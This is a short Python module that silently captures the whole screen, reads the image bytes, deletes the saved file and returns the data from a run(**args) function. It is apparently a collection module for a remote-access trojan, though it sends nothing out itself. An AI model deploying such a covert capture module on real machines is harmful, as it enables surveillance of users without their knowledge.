import win32gui
import win32ui
import win32api
import win32con
import time
import os
from PIL import ImageGrab
def screenshot():
    im = ImageGrab.grab()
    im.save('screenshot.png')
def run(**args):
    screenshot()
    f = open("screenshot.png","rb")
    data = f.read()
    f.close()
    os.remove("screenshot.png")
    return str(data)
